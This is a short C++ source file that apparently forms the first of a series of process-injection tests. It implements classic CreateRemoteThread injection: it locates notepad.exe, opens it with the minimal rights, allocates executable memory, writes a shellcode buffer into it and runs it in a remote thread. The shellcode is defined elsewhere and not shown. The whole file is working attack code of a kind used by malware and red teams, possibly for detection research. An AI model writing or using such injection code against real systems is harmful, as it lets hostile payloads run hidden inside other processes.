// t1_classic_crt_minimal.cpp
#include "common.h"

int main() {
    DWORD pid = GetPID(L"notepad.exe");
    if (!pid) {
        wprintf(L"[-] notepad.exe not found\n");
        return 1;
    }
    wprintf(L"[*] Target PID: %lu\n", pid);

    // Minimum rights for CRT injection
    HANDLE hProc = OpenProcess(
        PROCESS_VM_WRITE          |   // WriteProcessMemory
        PROCESS_VM_OPERATION      |   // VirtualAllocEx
        PROCESS_CREATE_THREAD     |   // CreateRemoteThread
        PROCESS_QUERY_INFORMATION,    // GetExitCodeThread
        FALSE, pid
    );
    if (!hProc) {
        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Handle acquired — requested 0x143a\n");

    LPVOID remoteMem = VirtualAllocEx(
        hProc, NULL, shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!remoteMem) {
        wprintf(L"[-] VirtualAllocEx failed\n");
        return 1;
    }
    wprintf(L"[+] Remote memory allocated: 0x%p\n", remoteMem);

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remoteMem, shellcode, shellcode_size, &written)) {
        wprintf(L"[-] WriteProcessMemory failed\n");
        return 1;
    }
    wprintf(L"[+] Shellcode written: %zu bytes\n", written);

    HANDLE hThread = CreateRemoteThread(
        hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteMem,
        NULL, 0, NULL
    );
    if (!hThread) {
        wprintf(L"[-] CreateRemoteThread failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Remote thread created\n");

    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
